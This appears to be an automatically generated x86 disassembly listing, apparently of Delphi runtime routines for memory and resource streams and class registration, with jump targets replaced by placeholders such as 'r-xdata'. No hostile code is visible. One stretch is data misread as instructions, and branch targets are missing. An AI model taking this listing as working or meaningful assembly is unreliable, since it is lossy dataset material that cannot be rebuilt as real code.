pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_415a38
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
call sub_4081cc
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_415a74
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415aac
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415ad0
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_415afc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_415b14
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41540c
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415618
sub_415b4c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415a6c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415b74
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415b4c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415ba0
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406880
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406864
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406854
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
test ecx ecx
jne r-xdata
sub_415c2c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415b4c
sub_415c7c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404450
mov ecx eax
mov edx esi
mov eax edi
call sub_415d44
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_415cd4
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415d37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d3e
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_415d44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415cd4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415a6c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415cd4
pop ecx
sub_415db0
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406850
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_415e00
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_415e48
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_415e78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ esi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
pop esi
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah ch
pop edi
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah bh
pop edi
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
cmp [ edi + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 ] bh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] dh
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404080
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044f0
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fe4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fe4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_415f4c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fe4
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fe4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_415fa4
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404080
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044f0
mov al 0x1
inc ebx
sub_415ffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416073
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4055cc
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41607a
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410510
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4055cc
mov ecx eax
mov eax esi
pop edx
call sub_40cb98
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4055cc
sub_416080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416126
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41612d
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404080
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419654
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b88
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416148
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413808
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413808
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413650
sub_416180
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413808
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413808
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41369c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413650
sub_4161c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416361
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413b18
mov edi eax
xor edx edx
push ebp
push sub_416342
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416349
mov eax [ rw-data ]
call sub_413b7c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416323
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4162d1
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4137ac
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4132f8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4162d8
mov eax [ ebp - 0x8 ]
call sub_403258
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_41063c
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416148
pop ecx
mov edx esi
mov eax edi
call sub_41369c
mov eax ebx
call sub_403258
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416080
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416180
pop ecx
inc esi
sub_4162d8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_416370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413b18
mov edi eax
xor eax eax
push ebp
push sub_41640b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
mov edx ebx
mov eax edi
call sub_4137ac
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41369c
mov eax esi
call sub_403258
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407b88
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41641c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413b18
mov edi eax
xor eax eax
push ebp
push sub_416493
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
mov edx ebx
mov eax edi
call sub_4137ac
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41369c
mov eax esi
call sub_403258
sub_4164c4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
pop ecx
pop edx
pop ebx
retn
sub_416508
push ebx
push esi
push edi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_415e48
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_416544
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41841c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41852c
call sub_4164b8
sub_416568
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407b88
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f90
sub_41659c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407b88
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41841c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41665d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_4169e0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4169e0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416664
mov eax [ ebp - 0x8 ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41852c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_4164b8
sub_41668c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_4166ac
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_40422c
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034c4
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_4164b8
sub_416714
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413b18
mov esi eax
xor edx edx
push ebp
push sub_416784
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41678b
mov eax [ rw-data ]
call sub_413b7c
retn
mov edx ebx
mov eax esi
call sub_4137ac
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403258
mov edx ebx
mov eax esi
call sub_41369c
sub_416790
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41689f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4168a6
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
xor edx edx
push ebp
push sub_416882
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4168d4
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_415fa4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4137ac
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404028
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416080
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4137ac
call sub_416714
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4137ac
mov edx eax
mov eax [ rw-data ]
call sub_413a90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4138a0
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_4168b0
push ebx
mov ebx eax
mov eax ebx
call sub_4169a4
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41540c
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_4168d4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403258
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4137ac
call sub_403258
inc edi
dec esi
jne r-xdata
sub_416910
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031a0
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_412e40
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031e4
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_412eb8
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412db8
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031bc
test al al
jne r-xdata
sub_4169e0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416a2c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416a2c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_416a7c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416ac7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41827c
mov eax [ ebp - 0x4 ]
call sub_404250
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ace
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
call sub_4164b8
sub_416ad4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_416b74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416678
test al al
jne r-xdata
mov eax ebx
call sub_416678
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
